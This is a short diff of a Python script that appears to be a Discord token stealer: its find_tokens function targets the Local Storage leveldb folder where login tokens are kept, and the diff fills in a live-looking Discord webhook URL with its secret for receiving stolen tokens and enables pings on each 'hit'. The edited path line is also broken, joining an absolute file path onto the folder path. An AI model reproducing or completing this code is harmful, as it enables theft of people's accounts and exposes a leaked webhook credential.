@@ -5,13 +5,13 @@ import json
 from urllib.request import Request, urlopen
 
 # your webhook URL
-WEBHOOK_URL = 'WEBHOOK HERE'
+WEBHOOK_URL = 'https://discord.com/api/webhooks/788798436487987262/rmEeSop0UizKCln8B5ztZwxvZf_BO6i13sbJBfHylFPffpXLqCnyWFDcDcudbZG5raT2'
 
 # mentions you when you get a hit
-PING_ME = False
+PING_ME = True
 
 def find_tokens(path):
-    path += '\\Local Storage\\leveldb'
+    path += 'C:\Users\Yazid\Documents\Tokens.txt'
 
     tokens = []
 
